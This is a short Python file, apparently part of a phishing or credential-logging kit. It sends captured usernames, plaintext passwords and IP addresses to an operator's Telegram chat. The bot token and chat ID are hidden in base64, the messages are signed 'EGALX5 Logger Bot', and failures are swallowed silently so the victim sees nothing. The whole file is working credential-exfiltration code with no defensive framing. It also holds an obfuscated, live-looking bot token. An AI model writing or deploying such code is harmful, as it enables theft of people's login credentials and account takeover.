# telegram_alert.py

import requests
import base64

# Encoded config (base64)
ENCODED_BOT_TOKEN = "NzY1NzYyNTg0NTpBQUVMN1JQMUxXRjJ0VUNXSGZLNzFvY2ZXcUdzRzRWdXNEWQ=="
ENCODED_CHAT_ID = "NjkyMzc0OTk2OQ=="

# Decode at runtime
BOT_TOKEN = base64.b64decode(ENCODED_BOT_TOKEN).decode()
CHAT_ID = base64.b64decode(ENCODED_CHAT_ID).decode()

def send_telegram_alert(username="default_user", password="default_pass", ip_address="0.0.0.0", status="unknown"):
    message = f"""
📌 New Login Details:

👤 Username: {username}
🔐 Password: {password}
🌐 IP Address: {ip_address}
📊 Status: {status}

- EGALX5 Logger Bot
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }

    try:
        requests.post(url, data=payload)
    except:
        pass  # No output, no error shown
